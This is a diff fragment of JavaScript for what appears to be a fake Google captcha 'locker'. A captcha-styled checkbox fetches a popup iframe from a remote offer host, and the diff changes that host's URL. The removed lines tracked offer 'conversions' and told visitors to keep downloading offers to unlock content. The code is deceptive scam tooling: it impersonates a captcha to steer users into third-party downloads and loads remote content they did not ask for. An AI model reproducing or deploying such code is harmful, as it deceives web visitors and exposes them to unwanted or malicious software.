@@ -98,7 +98,7 @@ contentLoaded(window, function() {
 
         var googleCaptchaIframeID = 'captcha-iframe';
         var popupIframeID = 'popup-iframe';
-        var popupIframeSrc = "https:\/\/redirectapps.org\/cp\/v\/jo6md";
+        var popupIframeSrc = "https:\/\/bouttiq.graphics\/cl\/i\/krr67g";
 
         jQuery('#' + CHECKBOX_ID).on('click', function() {
             var self = jQuery(this);
@@ -117,24 +117,6 @@ contentLoaded(window, function() {
             var blue_circle_loading_anim = jQuery('#' + BLUE_CIRCLE_LOADING_ID);
 
             setTimeout(function() {
-
-                                    window.startConversionChecker({
-                        channel: "Tool.CaptchaLocker.jo6md.ea591adf5deccba244d13fe7027b836d",
-                        route: "https:\/\/redirectapps.org\/cp\/ajax\/c\/jo6md",
-                        l_route: "https:\/\/redirectapps.org\/cp\/ajax\/e\/jo6md",
-                        completed: () => {
-                            jQuery("#google-captcha-popup-54673").remove();
-                                                            og_converted();
-                                                    },
-                        converted: (e) => {
-                            jQuery('#offer-' + e.offer_id).remove();
-                            var random_name = 'overlay-' + getRandomInt(11111, 99999);
-                            jQuery('body').append('<div id="' + random_name + '" style="position: fixed;width: 100%;height: 100%;top: 0;left: 0;background-color: rgba(0, 0, 0, 0.8);z-index: 120000;"><p style="width: 240px;top: 50%;left: 50%;-webkit-transform: translate(-50%, -50%);-ms-transform: translate(-50%, -50%);transform: translate(-50%, -50%);color: white;position: fixed;text-align: center;line-height: 24px;font: Helvetica, sans-serif;">Conversion complete! Please continue to download offers to unlock.</p></div>');
-                            setTimeout(function() {
-                                jQuery('body').find('#' + random_name).remove();
-                            }, 5000);
-                        },
-                    });
                 
                 jQuery.get(popupIframeSrc, function(data, textStatus, jqXHR) {
 
